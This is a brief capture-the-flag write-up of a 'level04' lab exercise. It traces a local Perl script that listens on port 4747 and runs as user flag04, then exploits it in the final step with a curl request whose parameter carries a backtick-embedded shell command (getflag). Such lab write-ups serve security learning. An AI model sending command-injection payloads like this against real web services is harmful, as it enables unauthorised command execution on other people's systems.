## Step 1
> ls ~

We saw the file ``level04.pl``.

## Step 2
We saw in it the commentary ``# localhost:4747``. We deduced that the program was runing in this port.

## Step 3
> ls -l level04.pl

The file is executed by the user flag04, even if we, as level04, do it.

## Step 4
> curl localhost:4747?x=\`getflag\`

The flag is printed.
